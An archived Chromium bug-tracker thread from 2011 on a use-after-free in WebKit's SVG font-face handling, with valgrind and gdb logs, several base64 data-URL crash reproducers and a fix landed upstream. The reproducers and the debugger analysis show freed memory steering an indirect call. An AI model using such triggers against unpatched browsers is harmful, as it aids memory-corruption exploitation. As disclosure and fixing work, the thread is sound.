==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== Invalid read of size 4
==31442==    at 0x20F0C35: WebCore::Node::getFlag(WebCore::Node::NodeFlags) const (Node.h:615)
==31442==    by 0x20F0C80: WebCore::Node::areSVGAttributesValid() const (Node.h:696)
==31442==    by 0x26ECEFD: WebCore::Element::getAttribute(WebCore::QualifiedName const&) const (Element.cpp:229)
==31442==    by 0x2C8EF0D: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==  Address 0x4141414141414191 is not stack'd, malloc'd or (recently) free'd
==31442== 
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== 
==31442== Process terminating with default action of signal 11 (SIGSEGV)
==31442==  General Protection Fault
==31442==    at 0x20F0C35: WebCore::Node::getFlag(WebCore::Node::NodeFlags) const (Node.h:615)
==31442==    by 0x20F0C80: WebCore::Node::areSVGAttributesValid() const (Node.h:696)
==31442==    by 0x26ECEFD: WebCore::Element::getAttribute(WebCore::QualifiedName const&) const (Element.cpp:229)
==31442==    by 0x2C8EF0D: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== 
==31442== HEAP SUMMARY:
==31442==     in use at exit: 1,152,893 bytes in 8,248 blocks
==31442==   total heap usage: 13,915 allocs, 5,667 frees, 3,017,882 bytes allocated
==31442== 
==31442== LEAK SUMMARY:
==31442==    definitely lost: 14,281 bytes in 15 blocks
==31442==    indirectly lost: 20,574 bytes in 419 blocks
==31442==      possibly lost: 136,572 bytes in 551 blocks
==31442==    still reachable: 154,603 bytes in 1,124 blocks
==31442==         suppressed: 826,863 bytes in 6,139 blocks
==31442== Rerun with --leak-check=full to see details of leaked memory
==31442== 
==31442== For counts of detected and suppressed errors, rerun with: -v
==31442== ERROR SUMMARY: 3 errors from 3 contexts (suppressed: 6 from 6)
/home/user/chromium/src/tools/valgrind/valgrind.sh: line 111: 31442 Killed                  G_SLICE=always-malloc NSS_DISABLE_ARENA_FREE_LIST=1 G_DEBUG=fatal_warnings GTEST_DEATH_TEST_USE_FORK=1 $RUN_COMMAND --trace-children=yes --suppressions="$SUPPRESSIONS" "${DEFAULT_TOOL_FLAGS[@]}" "$@"




### js...@chromium.org (2011-01-07)

I can't reproduce, but this seems like a spurious valgrind error. The "free" block is allocated immediately before the invalid dereference. So, I don't see how it could be freed, and consistency of the error makes random memory corruption unlikely.

### mi...@gmail.com (2011-01-08)

sorry if I'm going way too far with this one, but here's a gdb log for r70850 + git-webkit and the attached html file. the html doesn't crash nightly or stable.  

the relevant pointer is overwritten (freed?) in the destructor of SVGElement. and luckily/sometimes eventually overwritten with something interesting  

eventually there is a reference to something + 0x498.  if it's null, then segfault at 0x498, but if it's not, then crash. 

(gdb) r
Starting program: /home/user/chromium/src/out/Debug/chrome --single-process yeah.html
[Switching to Thread 0x7fffe43a7700 (LWP 18929)]

Breakpoint 3, WebCore::SVGFontFaceElement::horizontalOriginX (this=0x7fffa882f280) at third_party/WebKit/WebCore/svg/SVGFontFaceElement.cpp:146
146	    return m_fontElement->getAttribute(horiz_origin_xAttr).toFloat();
(gdb) c
Continuing.

Breakpoint 3, WebCore::SVGFontFaceElement::horizontalOriginX (this=0x7fffa882f780) at third_party/WebKit/WebCore/svg/SVGFontFaceElement.cpp:146
146	    return m_fontElement->getAttribute(horiz_origin_xAttr).toFloat();
(gdb) watch *0x7fffa882f780
Hardware watchpoint 4: *0x7fffa882f780
(gdb) disable 3
(gdb) c
Continuing.
Hardware watchpoint 4: *0x7fffa882f780

Old value = 96348176
New value = 96311024
0x0000000002c7f3fa in WebCore::SVGElement::~SVGElement (this=0x7fffa882f780, __in_chrg=<value optimized out>) at third_party/WebKit/WebCore/svg/SVGElement.cpp:66
66	SVGElement::~SVGElement()
(gdb) 
Continuing.

---snip snip--

Hardware watchpoint 4: *0x7fffa882f780

Old value = 1
New value = -1467810688
tcmalloc::SLL_SetNext (t=0x7fffa882f780, n=0x7fffa882fc80) at third_party/tcmalloc/chromium/src/linked_list.h:47
47	}
(gdb) p/x -1467810688
$1 = 0xa882fc80

(gdb) c
Continuing.

Breakpoint 1, WebCore::Element::getAttribute (this=0x7fffa882f780, name=...) at third_party/WebKit/WebCore/dom/Element.cpp:230
230	        updateAnimatedSVGAttribute(name);
(gdb) i r
rax            0x1	1
rbx            0x7fffa892edb0	140736021589424
rcx            0x5cff650	97515088
rdx            0x0	0
rsi            0x400000	4194304
rdi            0x7fffa882f780	140736020543360
rbp            0x7fffe43a3100	0x7fffe43a3100
rsp            0x7fffe43a30f0	0x7fffe43a30f0
r8             0x7fffe1f07b40	140736984021824
r9             0x49f1	18929
r10            0x0	0
r11            0x7ffff0da5c53	140737234230355
r12            0x0	0
r13            0x0	0
r14            0x7ffff7ffd040	140737354125376
r15            0x3	3
rip            0x26ff28e	0x26ff28e <WebCore::Element::getAttribute(WebCore::QualifiedName const&) const+134>
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) bt
#0  WebCore::Element::getAttribute (this=0x7fffa882f780, name=...) at third_party/WebKit/WebCore/dom/Element.cpp:230
#1  0x0000000002ca423b in WebCore::SVGFontFaceElement::ascent (this=0x7fffa882f780) at third_party/WebKit/WebCore/svg/SVGFontFaceElement.cpp:221
#2  0x0000000002ca4180 in WebCore::SVGFontFaceElement::verticalOriginY (this=0x7fffa882f780) at third_party/WebKit/WebCore/svg/SVGFontFaceElement.cpp:196
#3  0x0000000002c9f0ec in WebCore::SVGFontData::SVGFontData (this=0x7fffa892edb0, fontFaceElement=0x7fffa882f780) at third_party/WebKit/WebCore/svg/SVGFontData.cpp:34
#4  0x0000000002c22ef0 in WebCore::CSSFontFaceSource::getFontData (this=0x7fffa8e2c000, fontDescription=..., syntheticBold=false, syntheticItalic=false, fontSelector=0x7fffe1f07b40)
    at third_party/WebKit/WebCore/css/CSSFontFaceSource.cpp:171

#84 0x0000000000000000 in ?? ()
(gdb) disas
Dump of assembler code for function WebCore::Element::getAttribute(WebCore::QualifiedName const&) const:
--snip-snip--

=> 0x00000000026ff28e <+134>:	mov    -0x8(%rbp),%rax
   0x00000000026ff292 <+138>:	mov    (%rax),%rax
   0x00000000026ff295 <+141>:	add    $0x498,%rax
   0x00000000026ff29b <+147>:	mov    (%rax),%rcx
   0x00000000026ff29e <+150>:	mov    -0x10(%rbp),%rdx
   0x00000000026ff2a2 <+154>:	mov    -0x8(%rbp),%rax
   0x00000000026ff2a6 <+158>:	mov    %rdx,%rsi
   0x00000000026ff2a9 <+161>:	mov    %rax,%rdi
   0x00000000026ff2ac <+164>:	callq  *%rcx
   0x00000000026ff2ae <+166>:	mov    -0x10(%rbp),%rdx
   0x00000000026ff2b2 <+170>:	mov    -0x8(%rbp),%rax
---Type <return> to continue, or q <return> to quit---q
Quit

(gdb) x/gx $rbp-8
0x7fffe43a30f8:	0x00007fffa882f780

(gdb) p/x $rbp
$2 = 0x7fffe43a3100
(gdb) x/gx (long*)($rbp-8)
0x7fffe43a30f8:	0x00007fffa882f780
(gdb) x/gx *(long*)($rbp-8)
0x7fffa882f780:	0x00007fffa882fc80

(gdb) stepi
0x00000000026ff292	230	        updateAnimatedSVGAttribute(name);
(gdb) 
0x00000000026ff295	230	        updateAnimatedSVGAttribute(name);
(gdb) 
0x00000000026ff29b	230	        updateAnimatedSVGAttribute(name);
(gdb) p/x 0x00007fffa882fc80 + 0x498
$3 = 0x7fffa8830118
(gdb) i r
rax            0x7fffa8830118	140736020545816
rbx            0x7fffa892edb0	140736021589424
rcx            0x5cff650	97515088
(gdb) stepi
0x00000000026ff29e	230	        updateAnimatedSVGAttribute(name);
(gdb) i r
rax            0x7fffa8830118	140736020545816
rbx            0x7fffa892edb0	140736021589424
rcx            0xc00512066406b606	-4610258824886569466
(gdb) stepi
0x00000000026ff2a2	230	        updateAnimatedSVGAttribute(name);
(gdb) 
0x00000000026ff2a6	230	        updateAnimatedSVGAttribute(name);
(gdb) 
0x00000000026ff2a9	230	        updateAnimatedSVGAttribute(name);
(gdb) 
0x00000000026ff2ac	230	        updateAnimatedSVGAttribute(name);
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
0x00000000026ff2ac in WebCore::Element::getAttribute (this=0x7fffa882f780, name=...) at third_party/WebKit/WebCore/dom/Element.cpp:230
230	        updateAnimatedSVGAttribute(name);
(gdb) i r
rax            0x7fffa882f780	140736020543360
rbx            0x7fffa892edb0	140736021589424
rcx            0xc00512066406b606	-4610258824886569466
(gdb) disas
Dump of assembler code for function WebCore::Element::getAttribute(WebCore::QualifiedName const&) const:
=> 0x00000000026ff2ac <+164>:	callq  *%rcx
(gdb) 


### mi...@gmail.com (2011-01-09)

[Comment Deleted]

### mi...@gmail.com (2011-01-09)

[Comment Deleted]

### mi...@gmail.com (2011-01-10)

[Comment Deleted]

### mi...@gmail.com (2011-01-10)

[Comment Deleted]

### mi...@gmail.com (2011-01-10)

repro with no \r and no 0x09's

### mi...@gmail.com (2011-01-12)

(gdb) i b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000000002ca4b8f in WebCore::SVGFontFaceElement::SVGFontFaceElement(WebCore::QualifiedName const&, WebCore::Document*)
                                               at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:54
4       breakpoint     keep y   <MULTIPLE>         
4.1                         y     0x0000000002ca5162 in WebCore::SVGFontFaceElement::~SVGFontFaceElement() at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.h:34
4.2                         y     0x0000000002ca51d6 in WebCore::SVGFontFaceElement::~SVGFontFaceElement() at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.h:34
5       breakpoint     keep y   0x0000000002b5f10c in WebCore::CSSFontFaceSource::setSVGFontFaceElement(WebCore::SVGFontFaceElement*)
                                               at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
6       breakpoint     keep y   0x0000000002c23bd6 in WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*)
                                               at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.cpp:170
(gdb) r

Breakpoint 1, WebCore::SVGFontFaceElement::SVGFontFaceElement (this=0x7fffbbf58640, tagName="font-face", document=0x7fffe1738400)
    at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:54
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf43080, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63c00, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63700, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63600, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63900, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63400, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63180, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67
Breakpoint 5, WebCore::CSSFontFaceSource::setSVGFontFaceElement (this=0x7fffbbf63080, element=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.h:67

Breakpoint 4, WebCore::SVGFontFaceElement::~SVGFontFaceElement (this=0x7fffbbf58640, __in_chrg=<value optimized out>) at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.h:34

Program received signal SIGSEGV, Segmentation fault.

(gdb) bt

#0  ?? () at ./chrome/browser/tab_contents/infobar_delegate.h:136
#1  0x00000000026ffebe in WebCore::Element::getAttribute (this=0x7fffbbf58640, name="ascent") at third_party/WebKit/Source/WebCore/dom/Element.cpp:230
#2  0x0000000002ca424f in WebCore::SVGFontFaceElement::ascent (this=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:221
#3  0x0000000002ca4194 in WebCore::SVGFontFaceElement::verticalOriginY (this=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:196
#4  0x0000000002c9f100 in WebCore::SVGFontData::SVGFontData (this=0x7fffbbf5c8a0, fontFaceElement=0x7fffbbf58640) at third_party/WebKit/Source/WebCore/svg/SVGFontData.cpp:34
#5  0x0000000002c23c10 in WebCore::CSSFontFaceSource::getFontData (this=0x7fffbbf63080, fontDescription=..., syntheticBold=false, syntheticItalic=false, fontSelector=0x7fffe3e2f2d0)



### js...@chromium.org (2011-01-12)

I can't get this to repro yet, but I meant to reopen it for further investigation. However, I won't be able to get to it until next week at the earliest.

### mi...@gmail.com (2011-01-12)

sweet. here's small.html as a base64 dataurl.  let me know if I can do something to make it easier to repro.

data:text/html;base64,PHN2Zz4KPGcgaWQ9IlIiPgo8bGluZWFyR3JhZGllbnQgaWQ9ImciPjxhbmltYXRlVHJhbnNmb3Jt
IGF0dHJpYnV0ZU5hbWU9ImEiLz48L2xpbmVhckdyYWRpZW50Pgo8Zm9udD48Zm9udC1mYWNlIGZv
bnQtZmFtaWx5PSJ4Ii8+PC9mb250Pgo8dGV4dCBmb250LWZhbWlseT0ieCI+Cjx4PSI6L3gvMDAv
IiBiPSIKdj0iMiIgZQphYWEKZiBhIGFhIGMvMSBOIGEiIHEgPD08Cj0vPiI+CjwvZz48dXNlIHhs
aW5rOmhyZWY9IiNSIj4K


### mi...@gmail.com (2011-01-14)

here's the original repro (14l.html) as a data url. it crashes more often than small.html. it had some weird characters but they shouldn't mess things up inside the base64 encoding.  I tried it on windows xp +  8.0.552.237 aswell.

data:text/html;base64,PHN2Zz4+CjxnIGlkPSJCIj4KPHRleHQgZm9udC1mYW1pbHk9IngiIGY9IiI+PHRleHRQYXRoPgo8 L3RleHQ+Cjx0ZXh0IGZvbnQtZmFtaWx5PSJ4IiBmPSIiPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50 IGlkPSJnIj48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJncmFkaWVudFRyYW5zZm9y bSIvPjwvbGluZWFyR3JhZGllbnQ+Cjxmb250Pjxmb250LWZhY2UgZm9udC1mYW1pbHk9IngiIHg9 IiIvPjwvZm9udD4KPHRleHQgZm9udC1mYW1pbHk9IngiPgo8eG1sbnM6eGxpbms9ImY6L3gvMDAw MC8iIGJiYj0iImENCnY9IjIiCWUNZ2cgZgljIGZmIHIvMCBwIHEibiBxIDw9PAo9Ij4gbTwyIyA8 CXQtIi8+DQo8L2c+Cjx1c2UgeGxpbms6aHJlZj0iI0IiPjx1c2UgeGxpbms6aHJlZj0iI0IiPgo=


### mi...@gmail.com (2011-01-15)

one more

data:text/html;base64,PHN2Zz4KPHVzZSBpZD0iQiI+CjxsaW5lYXJHcmFkaWVudCBpZD0iZyI+CjxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9IjIiLz4KPHRleHQgZm9udC1mYW1pbHk9IngiPgo8dGV4dFBhdGg+Cjxmb250Pgo8Zm9udC1mYWNlIGZvbnQtZmFtaWx5PSJ4Ii8+Cjx0ZXh0IGZvbnQtZmFtaWx5PSJ4Ij4KPHgveC8wMC8iIGI9IiJ2PSIiZSBhYSBhIGMgYWYgci8wIHAgYW4gcQo8L3VzZT4KPC9zdmc+Cjxzdmc+Cjx1c2UgeGxpbms6aHJlZj0iI0IiPgo8dXNlIHhsaW5rOmhyZWY9IiNCIj4K


### sc...@gmail.com (2011-01-22)

Ooh! That last one, https://crbug.com/chromium/68120#c24, crashes every time for me.
Linux 32-bit release, 10.0.642.2 dev
https://crash/reportdetail?reportid=62ecff6e79c07b86

Thread 0 *CRASHED* ( SIGSEGV @ 0x0000024d )

0x09583b04	 [chrome	 - third_party/WebKit/Source/WebCore/dom/Element.cpp:230]	WebCore::Element::getAttribute
0x0995fa78	 [chrome	 - third_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:126]	WebCore::SVGFontFaceElement::unitsPerEm
0x0944b719	 [chrome	 - third_party/WebKit/Source/WebCore/platform/graphics/SimpleFontData.cpp:77]	WebCore::SimpleFontData::SimpleFontData
0x098fc5a5	 [chrome	 - third_party/WebKit/Source/WebCore/css/CSSFontFaceSource.cpp:171]	WebCore::CSSFontFaceSource::getFontData
0x098fb572	 [chrome	 - third_party/WebKit/Source/WebCore/css/CSSFontFace.cpp:112]	WebCore::CSSFontFace::getFontData
0x0987c4db	 [chrome	 - third_party/WebKit/Source/WebCore/css/CSSSegmentedFontFace.cpp:106]	WebCore::CSSSegmentedFontFace::getFontData
0x0986fe35	 [chrome	 - third_party/WebKit/Source/WebCore/css/CSSFontSelector.cpp:543]	WebCore::CSSFontSelector::getFontData
0x094058b1	 [chrome	 - third_party/WebKit/Source/WebCore/platform/graphics/FontCache.cpp:386]	WebCore::FontCache::getFontData
0x09405cc8	 [chrome	 - third_party/WebKit/Source/WebCore/platform/graphics/FontFallbackList.cpp:105]	WebCore::FontFallbackList::fontDataAt
0x09405d65	 [chrome	 - third_party/WebKit/Source/WebCore/platform/graphics/FontFallbackList.h:66]	WebCore::FontFallbackList::determinePitch
0x0977a14d	 [chrome	 - third_party/WebKit/Source/WebCore/platform/graphics/FontFallbackList.h:47]	WebCore::RenderBlock::findNextLineBreak
0x0977b713	 [chrome	 - third_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:667]	WebCore::RenderBlock::layoutInlineChildren
0x099054cb	 [chrome	 - third_party/WebKit/Source/WebCore/rendering/RenderBlock.h:307]	WebCore::RenderSVGText::layout
0x09907e4e	 [chrome	 - third_party/WebKit/Source/WebCore/rendering/svg/SVGRenderSupport.cpp:233]	WebCore::SVGRenderSupport::layoutChildren
...

Maybe I can look at it next week if Justin is busy.

### mi...@gmail.com (2011-01-22)

#24 has most of the html wrapped in a use-tag instead of a g-tag.

<svg>
<use id="B">
<linearGradient id="g">
<animateTransform attributeName="2"/>
<text font-family="x">
<textPath>
<font>
<font-face font-family="x"/>
<text font-family="x">
<x/x/00/" b=""v=""e aa a c af r/0 p an q
</use>
</svg>
<svg>
<use xlink:href="#B">
<use xlink:href="#B">

### in...@chromium.org (2011-01-24)

m_fontElement is bad in SVGFontFaceElement::horizontalOriginX for repro in c#24.

### js...@chromium.org (2011-01-27)

Grabbing this now.

### js...@chromium.org (2011-01-27)

The level of nesting and interaction with animation is really weird, but it's definitely a stale pointer. I'm testing a patch and expect to post it for review upstream today.

### js...@chromium.org (2011-01-28)

Filed upstream as https://bugs.webkit.org/show_bug.cgi?id=53270

Patch up for review.


### js...@chromium.org (2011-01-28)

Fix landed upstream: http://trac.webkit.org/changeset/76990

### sc...@gmail.com (2011-02-01)

@miaubiz: congrats! This bug report qualifies for a provisional $1000 Chromium Security Reward.
We are rewarding above the base amount because:
- Thanks for your persistence in noting the second distinct bug involved here, including the valgrind heroics!
- Thanks for all the repro variants (including one that fired reliably).

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### js...@chromium.org (2011-02-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-02-02)

Merged to m9 at: http://trac.webkit.org/changeset/77348

### in...@chromium.org (2011-02-09)

merged to m10 in r78117.

### sc...@gmail.com (2011-02-12)

Invoice finalized; payment is in e-payment system.

Was fixed in 9.0.597.94

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/68120?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086502)*
